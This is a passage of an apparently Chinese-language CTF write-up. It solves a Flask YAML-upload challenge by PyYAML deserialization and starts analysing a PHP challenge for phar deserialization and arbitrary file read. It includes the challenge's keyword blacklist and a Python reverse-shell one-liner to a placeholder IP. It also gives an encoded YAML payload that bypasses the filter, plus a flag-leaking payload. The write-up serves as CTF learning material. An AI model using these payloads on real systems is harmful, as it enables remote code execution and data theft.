'''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            uploaded_file <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> uploaded_file <span class="token keyword">and</span> is_yaml_file<span class="token punctuation">(</span>uploaded_file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>                file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> uploaded_file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>                uploaded_file<span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"uploaded successfully"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Just YAML file"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Yam1'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Yam1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> filename<span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">.yaml'</span></span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            file_content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token punctuation">:</span>            test <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>file_content<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'welcome'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显是打 pyyaml 反序列化，版本肯定是漏洞版本的，只需要考虑绕 waf 即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">blacklist_terms <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'apply'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span>                       <span class="token string">'command'</span><span class="token punctuation">,</span><span class="token string">'static'</span><span class="token punctuation">,</span><span class="token string">'templates'</span><span class="token punctuation">,</span><span class="token string">'session'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'globals'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span>                       <span class="token string">'run'</span><span class="token punctuation">,</span> <span class="token string">'ntimeit'</span><span class="token punctuation">,</span> <span class="token string">'bash'</span><span class="token punctuation">,</span> <span class="token string">'zsh'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'curl'</span><span class="token punctuation">,</span> <span class="token string">'nc'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'before_request'</span><span class="token punctuation">,</span> <span class="token string">'after_request'</span><span class="token punctuation">,</span>                       <span class="token string">'error_handler'</span><span class="token punctuation">,</span> <span class="token string">'add_url_rule'</span><span class="token punctuation">,</span><span class="token string">'teardown_request'</span><span class="token punctuation">,</span><span class="token string">'teardown_appcontext'</span><span class="token punctuation">,</span><span class="token string">'\\u'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">'base64'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="非预期-1"><a href="#非预期-1" class="headerlink" title="非预期"></a>非预期</h2><p>ban了很多，但是忘了url编码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("xxx.xxx.xxx.xxx",7777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接打一个 extend 触发即可</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!python/object/new:type</span><span class="token key atrule">args</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> exp  <span class="token punctuation">-</span> <span class="token tag">!!python/tuple</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token punctuation">-</span> <span class="token punctuation">&#123;</span><span class="token key atrule">"extend"</span><span class="token punctuation">:</span> <span class="token tag">!!python/name:exec</span> <span class="token punctuation">&#125;</span><span class="token key atrule">listitems</span><span class="token punctuation">:</span> <span class="token string">"import urllib; exec(urllib.parse.unquote('%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%73%79%73%74%65%6d%28%27%70%79%74%68%6f%6e%33%20%2d%63%20%5c%27%69%6d%70%6f%72%74%20%6f%73%2c%70%74%79%2c%73%6f%63%6b%65%74%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%31%31%2e%78%78%78%2e%78%78%78%2e%31%35%39%22%2c%37%37%37%37%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%29%66%6f%72%20%66%20%69%6e%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29%5c%27%27%29'))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="预期-1"><a href="#预期-1" class="headerlink" title="预期"></a>预期</h2><p>之前 <a href="https://c1oudfl0w0.github.io/blog/2024/09/28/SCTF-2024/#%E9%A2%84%E6%9C%9F%EF%BC%9AWSGI%E5%B8%A6%E5%87%BA%E5%9B%9E%E6%98%BE">sctf</a> 提过在 wsgi 头带出回显的操作，这次就是利用这一手操作实现回显</p><p>修改 WSGIRequestHandler 对象 server_version 的值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> werkzeug<span class="token builtin">setattr</span><span class="token punctuation">(</span>werkzeug<span class="token punctuation">.</span>serving<span class="token punctuation">.</span>WSGIRequestHandler<span class="token punctuation">,</span> <span class="token string">"server_version"</span><span class="token punctuation">,</span><span class="token string">'想要带出的数据'</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构造yaml：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!python/object/new:type</span>        <span class="token key atrule">args</span><span class="token punctuation">:</span>         <span class="token punctuation">-</span> exp         <span class="token punctuation">-</span> <span class="token tag">!!python/tuple</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>         <span class="token punctuation">-</span> <span class="token punctuation">&#123;</span><span class="token key atrule">"extend"</span><span class="token punctuation">:</span> <span class="token tag">!!python/name:exec</span> <span class="token punctuation">&#125;</span>        <span class="token key atrule">listitems</span><span class="token punctuation">:</span> <span class="token punctuation">|</span><span class="token scalar string">         bb=open("/flag").read()         import werkzeug         setattr(werkzeug.serving.WSGIRequestHandler, "server_version",bb )</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250122001931230.png" alt="image-20250122001931230"></p><hr><h1 id="strange-php（复现）"><a href="#strange-php（复现）" class="headerlink" title="strange_php（复现）"></a>strange_php（复现）</h1><p>审一下源码，看一下主要逻辑</p><p>welcome.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$action</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'message'</span><span class="token punctuation">:</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"write messageing"</span><span class="token punctuation">;</span>            <span class="token variable">$decodedMessage</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'encodedMessage'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">writeMessage</span><span class="token punctuation">(</span><span class="token variable">$decodedMessage</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"写入失败"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$filePath</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">get_filePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$filePath</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"留言已写入: "</span><span class="token operator">.</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">get_filePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string single-quoted-string">'editMessage'</span><span class="token punctuation">:</span>                <span class="token variable">$decodedEditMessage</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'encodedEditMessage'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">editMessage</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$decodedEditMessage</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"留言已成功更改"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"操作失败，请重新尝试"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">:</span>            <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">deleteMessage</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"留言已成功删除"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"操作失败，请重新尝试"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string single-quoted-string">'clean'</span><span class="token punctuation">:</span>                <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm log/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm txt/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>能写入或删除任意txt，并且写入路径可知</p><p>跟进一下相关功能的函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">writeMessage</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 写入留言到文件中</span>    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filePath</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">deleteMessage</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token operator">.</span><span class="token string double-quoted-string">".txt"</span><span class="token punctuation">;</span>    <span class="token comment">// 删除留言文件</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$msg</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>unlink处明显可以打phar反序列化，path 是我们可控的，写入文件的内容也没有限制</p><p>然后看 __set 方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span>  <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filePath</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/log/"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filePath</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".txt"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filePath 可控，可以实现任意文件读取</p><p>那么如何触发 __set 呢？</p><p>本着这种题目给的东西都有利用可能的原则，猜测要在数据库这里做文章</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PDO_connect</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$pdo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$con_options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//use to set options of PDO connections</span>    <span class="token keyword">public</span> <span class="token variable">$smt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"dsn"</span><span class="token operator">=></span><span class="token string double-quoted-string">"mysql:host=localhost:3306;dbname=users;charset=utf8"</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'host'</span><span class="token operator">=></span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'port'</span><span class="token operator">=></span><span class="token string single-quoted-string">'3306'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'user'</span><span class="token operator">=></span><span class="token string single-quoted-string">'joker'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'password'</span><span class="token operator">=></span><span class="token string single-quoted-string">'joker'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'charset'</span><span class="token operator">=></span><span class="token string single-quoted-string">'utf8'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'options'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token operator">=></span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">,</span>                <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span> <span class="token operator">=></span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dsn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">-></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">-></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Connection Error: '</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里专门给了一个 con_options 可控，可以猜测在 options 